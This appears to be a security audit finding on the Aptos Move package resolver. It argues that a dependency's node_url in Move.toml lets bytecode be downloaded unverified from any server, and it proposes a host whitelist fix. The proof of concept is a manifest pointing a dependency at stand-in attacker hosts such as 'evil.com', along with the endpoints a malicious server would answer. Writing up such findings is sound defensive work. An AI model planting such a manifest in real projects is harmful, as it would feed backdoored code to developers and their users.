# Audit Report

## Title
Supply Chain Attack via Unvalidated Node URL in Move Package Resolver

## Summary
The Move package resolver allows attackers to specify arbitrary node URLs in Move.toml dependencies, causing the package resolver to download and cache malicious Move bytecode from attacker-controlled servers without any cryptographic verification. This enables supply chain attacks where malicious bytecode is treated as legitimate on-chain code.

## Finding Description

The vulnerability exists in how the Move package resolver handles on-chain dependencies specified in `Move.toml` files. The `SourceLocation::OnChain` variant stores a `CanonicalNodeIdentity` that is derived directly from user-controlled input without validation that it points to a legitimate Aptos network node. [1](#0-0) 

The `CanonicalNodeIdentity` is created from arbitrary URLs with only basic normalization (lowercasing, port handling), providing no security validation: [2](#0-1) 

When a Move package specifies an on-chain dependency in its manifest, the `node_url` field is a simple string that can point to any URL: [3](#0-2) 

During dependency resolution, this user-controlled `node_url` is parsed and passed directly to the package fetching logic: [4](#0-3) 

The `get_package_local_path` function then uses this URL without any validation: [5](#0-4) 

The `fetch_on_chain_package` function creates an Aptos REST client pointing to the attacker's URL and downloads whatever bytecode the malicious server provides: [6](#0-5) 

The REST client implementation performs no cryptographic verification of the returned data: [7](#0-6) [8](#0-7) [9](#0-8) 

**Attack Path:**
1. Attacker creates malicious Move package with dependency: `MyPackage = { aptos = "https://evil.com", address = "0x1" }`
2. Victim includes this package as a dependency
3. Package resolver parses the `node_url` and creates REST client to `https://evil.com`
4. Attacker's server responds to API calls with malicious bytecode
5. Malicious bytecode is downloaded, cached, and used for compilation
6. Victim unknowingly compiles against backdoored dependencies

## Impact Explanation

This is a **Critical Severity** vulnerability that enables:

1. **Supply Chain Attacks**: Attackers can inject malicious bytecode into the dependency chain of Move projects, compromising the security of any project that depends on malicious packages
2. **Arbitrary Code Execution**: Malicious bytecode could contain backdoors, vulnerabilities, or logic bombs that execute when the victim's code interacts with the compromised dependency
3. **Loss of Funds**: Backdoored dependencies could steal private keys, manipulate transaction logic, or redirect funds
4. **Consensus/Safety Violations**: If malicious packages are deployed on-chain, they could introduce consensus bugs or safety violations in the broader ecosystem

The vulnerability breaks the **Deterministic Execution** and **Access Control** invariants by allowing untrusted bytecode to masquerade as legitimate on-chain code without any verification mechanism.

## Likelihood Explanation

**Likelihood: High**

This attack is highly likely because:
- **Zero Privilege Required**: Any package author can specify arbitrary `node_url` values
- **No Technical Barriers**: Setting up a malicious REST API server is trivial
- **Silent Exploitation**: Victims have no indication that dependencies are being fetched from non-standard sources
- **Transitive Dependencies**: The attack propagates through dependency chains
- **No Validation**: There is zero cryptographic verification of the downloaded bytecode

The only requirement is convincing users to depend on a package with a malicious `node_url`, which is achievable through social engineering, typosquatting, or compromising existing package repositories.

## Recommendation

Implement multi-layered validation:

1. **Whitelist Trusted Node URLs**: Maintain a hardcoded list of official Aptos network endpoints (mainnet, testnet, devnet) and reject any other URLs
2. **Cryptographic Verification**: Verify that fetched data includes valid state proofs and matches known state roots signed by the validator set
3. **User Warnings**: Display prominent warnings when packages specify custom node URLs
4. **Integrity Checks**: Implement content-addressable storage with hash verification for all downloaded packages

**Example Fix** (in `resolver.rs`):

```rust
// In resolve_dependency function, add validation after parsing node_url
let remote_url = Url::from_str(&node_url)?;

// Validate against whitelist of official Aptos networks
const TRUSTED_NODES: &[&str] = &[
    "fullnode.mainnet.aptoslabs.com",
    "fullnode.testnet.aptoslabs.com", 
    "fullnode.devnet.aptoslabs.com",
];

let host = remote_url.host_str()
    .ok_or_else(|| anyhow!("Invalid node URL: no host"))?;
    
if !TRUSTED_NODES.iter().any(|&trusted| host == trusted) {
    bail!(
        "Untrusted node URL detected: {}. Only official Aptos networks are allowed. \
        If you need to use a custom node, please configure it explicitly in your \
        package configuration and acknowledge the security risks.",
        remote_url
    );
}
```

Additionally, implement cryptographic verification of downloaded bytecode using merkle proofs and validator signatures.

## Proof of Concept

Create a malicious Move package with the following `Move.toml`:

```toml
[package]
name = "MaliciousPackage"
version = "1.0.0"

[dependencies]
AptosFramework = { aptos = "https://attacker-controlled-node.com", address = "0x1" }

[addresses]
std = "0x1"
```

Set up a malicious server at `https://attacker-controlled-node.com` that:
1. Responds to `/v1/` endpoint for ledger information with fake version data
2. Responds to `/v1/accounts/0x1/resource/0x1::code::PackageRegistry?ledger_version=X` with fake PackageRegistry containing malicious module metadata
3. Responds to `/v1/accounts/0x1/modules/MODULENAME?ledger_version=X` with malicious bytecode

When a victim runs:
```bash
aptos move compile
```

The package resolver will:
1. Parse the dependency and extract `node_url = "https://attacker-controlled-node.com"`
2. Create REST client to attacker's server
3. Download malicious bytecode
4. Cache it in `~/.move/package-cache/on-chain/`
5. Use it for compilation

The victim now has malicious bytecode integrated into their build without any warning or verification.

**Notes**

This vulnerability represents a critical failure in the Move package ecosystem's security model. The absence of any cryptographic verification when fetching on-chain packages creates a fundamental trust boundary violation. While the Aptos blockchain itself maintains strong security guarantees through consensus and cryptographic verification, the tooling layer completely bypasses these protections by trusting arbitrary HTTP endpoints specified in manifest files.

The issue is particularly severe because it affects the build-time dependency resolution process, meaning malicious code can be injected before any on-chain security measures take effect. This is analogous to npm's historical issues with package registry attacks, but worse because blockchain systems require higher security standards due to the immutable and financial nature of deployed code.

### Citations

**File:** third_party/move/tools/move-package-resolver/src/identity.rs (L19-22)
```rust
    OnChain {
        node: CanonicalNodeIdentity,
        package_addr: AccountAddress,
    },
```

**File:** third_party/move/tools/move-package-cache/src/canonical.rs (L90-109)
```rust
impl CanonicalNodeIdentity {
    pub fn new(node_url: &Url) -> Result<Self> {
        let host = node_url
            .host_str()
            .ok_or_else(|| anyhow!("invalid node URL, unable to extract host: {}", node_url))?
            .to_ascii_lowercase();

        let port = match node_url.port() {
            Some(port) => match (node_url.scheme(), port) {
                ("http", 80) | ("https", 443) => "".to_string(),
                _ => format!(":{}", port),
            },
            None => "".to_string(),
        };

        let path = node_url.path().to_ascii_lowercase();
        let path = path.trim_end_matches("/");

        Ok(Self(format!("{}{}{}", host, port, path)))
    }
```

**File:** third_party/move/tools/move-package-manifest/src/manifest.rs (L149-155)
```rust
    Aptos {
        /// URL to the Aptos full-node connected to the network where the package is published.
        node_url: String,

        /// Address of the published package.
        package_addr: AccountAddress,
    },
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L186-202)
```rust
    Ok(match &identity.location {
        SourceLocation::OnChain {
            node: _,
            package_addr,
        } => {
            let fullnode_url = user_provided_url.expect("must be specified for on-chain dep");

            let network_version = package_lock.resolve_network_version(fullnode_url).await?;

            package_cache
                .fetch_on_chain_package(
                    fullnode_url,
                    network_version,
                    *package_addr,
                    &identity.name,
                )
                .await?
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L413-428)
```rust
        PackageLocation::Aptos {
            node_url,
            package_addr,
        } => {
            remote_url = Url::from_str(&node_url)?;

            let identity = PackageIdentity {
                name: dep_name.to_string(),
                location: SourceLocation::OnChain {
                    node: CanonicalNodeIdentity::new(&remote_url)?,
                    package_addr,
                },
            };

            (identity, Some(&remote_url))
        },
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L331-408)
```rust
        let client = aptos_rest_client::Client::new(fullnode_url.clone());

        let package_registry = client
            .get_account_resource_at_version_bcs::<PackageRegistry>(
                address,
                "0x1::code::PackageRegistry",
                network_version,
            )
            .await?
            .into_inner();

        let package = match package_registry
            .packages
            .iter()
            .find(|package_metadata| package_metadata.name == package_name)
        {
            Some(package) => package,
            None => bail!(
                "package not found: {}//{}::{}",
                fullnode_url,
                address,
                package_name
            ),
        };

        self.listener
            .on_bytecode_package_receive_metadata(address, package);

        // Download all modules of the package concurrently.
        //
        // The downloaded files are first saved into a temporary directory, and then
        // the temporary directory is atomically renamed/moved to the destination.
        // This is to ensure we only expose complete downloads.
        let temp = tempfile::tempdir_in(&on_chain_packages_path)?;

        let fetch_futures = package.modules.iter().map(|module| {
            let client = client.clone();
            let temp_path = temp.path().to_owned();
            let package_name = package_name.to_string();
            let module_name = module.name.clone();

            async move {
                let module_bytes = client
                    .get_account_module_bcs_at_version(address, &module_name, network_version)
                    .await?
                    .into_inner();

                let module_file_path = temp_path.join(&module_name).with_extension("mv");

                // Use blocking file write in spawn_blocking to avoid blocking the async runtime
                tokio::task::spawn_blocking(move || {
                    fs::create_dir_all(module_file_path.parent().unwrap())?;
                    let mut file = File::create(&module_file_path)?;
                    file.write_all(&module_bytes)?;
                    Ok::<(), std::io::Error>(())
                })
                .await??;

                // Notify listener after writing
                self.listener.on_bytecode_package_receive_module(
                    address,
                    &package_name,
                    &module_name,
                );
                Ok::<(), anyhow::Error>(())
            }
        });

        future::try_join_all(fetch_futures).await?;

        remove_dir_if_exists(&cached_package_path)?;
        fs::rename(temp.into_path(), &cached_package_path)?;

        self.listener
            .on_bytecode_package_download_complete(address, package_name);

        Ok(cached_package_path)
    }
```

**File:** crates/aptos-rest-client/src/lib.rs (L1223-1238)
```rust
    pub async fn get_account_resource_at_version_bcs<T: DeserializeOwned>(
        &self,
        address: AccountAddress,
        resource_type: &str,
        version: u64,
    ) -> AptosResult<Response<T>> {
        let url = self.build_path(&format!(
            "accounts/{}/resource/{}?ledger_version={}",
            address.to_hex(),
            resource_type,
            version
        ))?;

        let response = self.get_bcs(url).await?;
        Ok(response.and_then(|inner| bcs::from_bytes(&inner))?)
    }
```

**File:** crates/aptos-rest-client/src/lib.rs (L1645-1656)
```rust
    async fn check_response(
        &self,
        response: reqwest::Response,
    ) -> AptosResult<(reqwest::Response, State)> {
        if !response.status().is_success() {
            Err(parse_error(response).await)
        } else {
            let state = parse_state(&response)?;

            Ok((response, state))
        }
    }
```

**File:** crates/aptos-rest-client/src/lib.rs (L1687-1690)
```rust
    async fn get_bcs(&self, url: Url) -> AptosResult<Response<bytes::Bytes>> {
        let response = self.inner.get(url).header(ACCEPT, BCS).send().await?;
        self.check_and_parse_bcs_response(response).await
    }
```
